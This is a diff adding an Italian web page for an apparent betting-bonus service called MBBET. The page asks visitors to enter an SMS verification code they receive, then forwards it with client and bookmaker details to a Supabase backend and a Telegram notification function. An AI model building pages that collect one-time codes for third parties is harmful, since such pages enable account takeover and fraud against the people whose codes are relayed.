@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>MBBET — Conferma codice</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#050714;--gold:#ff1440;--green:#00e58a;--tx:#fff;--tx3:#6b83a0}
+html,body{min-height:100%;background:var(--bg);color:var(--tx);font-family:system-ui,-apple-system,sans-serif}
+.wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{width:100%;max-width:380px;background:rgba(10,13,32,.95);border:1px solid rgba(255,255,255,.08);border-radius:18px;padding:30px 26px;text-align:center}
+.logo{height:26px;margin-bottom:18px}
+h1{font-size:17px;font-weight:900;margin-bottom:10px}
+p{font-size:13px;color:var(--tx3);line-height:1.6;margin-bottom:20px}
+input{width:100%;padding:14px;font-size:20px;text-align:center;letter-spacing:3px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.12);border-radius:10px;color:var(--tx);font-family:inherit;outline:none;margin-bottom:14px}
+input:focus{border-color:rgba(255,20,64,0.5)}
+button{width:100%;padding:14px;background:linear-gradient(135deg,#3a0507,var(--gold));border:none;border-radius:10px;color:#000;font-size:14px;font-weight:900;cursor:pointer;font-family:inherit}
+button:disabled{opacity:.5;cursor:default}
+.ok{display:none;text-align:center}
+.ok-ic{font-size:40px;margin-bottom:10px}
+.err{color:#ff5757;font-size:12.5px;margin-top:10px;min-height:16px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="card">
+    <img class="logo" src="mbbet_logo_transparent.png" alt="MBBET">
+    <div id="form-box">
+      <h1 id="titolo">Scrivi il codice ricevuto</h1>
+      <p id="sottotitolo">Ti sta arrivando un SMS con un codice di verifica — appena arriva, scrivilo qui sotto e invia. Basta questo, nient'altro.</p>
+      <input id="codice" type="text" inputmode="numeric" placeholder="Es. 123456" maxlength="10" onkeydown="if(event.key==='Enter')invia()">
+      <button id="btn-invia" onclick="invia()">Invia il codice</button>
+      <div class="err" id="err"></div>
+    </div>
+    <div class="ok" id="ok-box">
+      <div class="ok-ic">✅</div>
+      <h1>Fatto, grazie!</h1>
+      <p>Il codice è arrivato al team, se ne stanno già occupando.</p>
+    </div>
+  </div>
+</div>
+
+<script src="shared/supabase.min.js"></script>
+<script>
+var SUPA_URL='https://ntwqfuvcosvzpqrfpipn.supabase.co';
+var SUPA_ANON='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im50d3FmdXZjb3N2enBxcmZwaXBuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI4NTQzNzYsImV4cCI6MjA5ODQzMDM3Nn0.i_JkizD5xMQBNYi0W8T_1lY0jO8vPJPYUajWm-jjODg';
+var db=supabase.createClient(SUPA_URL,SUPA_ANON);
+
+function qs(k){return new URLSearchParams(window.location.search).get(k);}
+var bonusId=qs('id');
+if(!bonusId){
+  document.getElementById('titolo').textContent='Link non valido';
+  document.getElementById('sottotitolo').textContent='Manca un riferimento nel link — chiedi a chi te lo ha mandato di ricontrollarlo.';
+  document.getElementById('codice').style.display='none';
+  document.getElementById('btn-invia').style.display='none';
+}
+
+async function invia(){
+  var codice=(document.getElementById('codice').value||'').trim();
+  var err=document.getElementById('err');
+  err.textContent='';
+  if(!codice){err.textContent='Scrivi il codice ricevuto prima di inviare.';return;}
+  var btn=document.getElementById('btn-invia');
+  btn.disabled=true;btn.textContent='Invio...';
+  try{
+    var r=await db.rpc('rpc_submit_codice_sms',{p_bonus_id:bonusId,p_codice:codice});
+    if(r.error)throw r.error;
+    var riga=r.data&&r.data[0];
+    if(!riga){
+      err.textContent='Link non riconosciuto — chiedi a chi te lo ha mandato di ricontrollarlo.';
+      btn.disabled=false;btn.textContent='Invia il codice';
+      return;
+    }
+    document.getElementById('form-box').style.display='none';
+    document.getElementById('ok-box').style.display='block';
+    fetch('/.netlify/functions/telegram-notify-sms-code',{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({bonus_id:bonusId,cliente:riga.cliente,bookmaker:riga.bookmaker,codice:codice})
+    }).catch(function(){});
+  }catch(e){
+    err.textContent='Errore, riprova: '+(e.message||e);
+    btn.disabled=false;btn.textContent='Invia il codice';
+  }
+}
+</script>
+</body>
+</html>
